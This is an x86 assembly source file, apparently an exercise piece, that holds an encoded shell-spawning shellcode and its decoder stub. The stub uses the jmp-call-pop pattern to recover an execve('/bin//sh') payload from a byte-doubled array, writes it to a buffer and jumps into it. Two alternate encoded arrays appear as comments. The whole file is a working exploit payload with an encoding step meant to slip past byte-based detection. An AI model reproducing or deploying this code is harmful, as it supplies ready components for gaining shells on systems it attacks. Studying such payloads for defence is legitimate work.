global _start

section .bss
shellcode: resb 48

section .text

_start:
	jmp short call_shellcode



decoder:
	pop esi
	lea edi, [shellcode] 	;write pointer
				;push edi

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x2 		;counter will be from 2 as there is no need to move the 1st opcode 
	;mov cl, 0x0		;index pointer that will be used along with read pointer 'edx' and will increase by 2 each time
	
decode:
	cmp al,0x19		;size of actual shellcode is 23 bytes
	jz return_shellcode

	mov bl, byte [esi+ecx]
	mov byte [edi], bl

	add ecx,0x2
	inc edi			;mov edi by 1	
	inc al			;increase al by 1
	jmp short decode

call_shellcode:
	call decoder
	EncodedShellcode: db 0x31,0x31,0xc0,0xc0,0x50,0x50,0x68,0x68,0x2f,0x2f,0x2f,0x2f,0x73,0x73,0x68,0x68,0x68,0x68,0x2f,0x2f,0x62,0x62,0x69,0x69,0x6e,0x6e,0x89,0x89,0xe3,0xe3,0x50,0x50,0x53,0x53,0x89,0x89,0xe1,0xe1,0xb0,0xb0,0x0b,0x0b,0xcd,0xcd,0x80,0x80,
	;EncodedShellcode: db 0x31,0x31,0xc0,0xc0,0x50,0x50,0x68,0x68,0x2f,0x2f,0x2f,0x2f,0x73,0x73,0x68,0x68,0x68,0x68,0x2f,0x2f,0x62,0x62,0x69,0x69,0x6e,0x6e,0x89,0x89,0xe3,0xe3,0x50,0x50,0x0b,0x0b,0xcd,0xcd,0x80,0x80,
	;EncodedShellcode: db 0x31,0x31,0xc0,0xc0,0x50,0x50,0x68,0x68,0x2f,0x2f,0x2f,0x2f,0x73,0x73,0x68,0x68,0x68,0x68,0x2f,0x2f,0x62,0x62,0x69,0x69,0x6e,0x6e,0x87,0x87,0xe3,0xe3,0xb0,0xb0,0x0b,0x0b,0xcd,0xcd,0x80,0x80,

return_shellcode:
	;jump shellcode
	xor eax,eax
	push eax
	sub esp,4
	push shellcode
	jmp [esp]

	add esp,8
	xor eax,eax
	inc eax
	int 0x80	
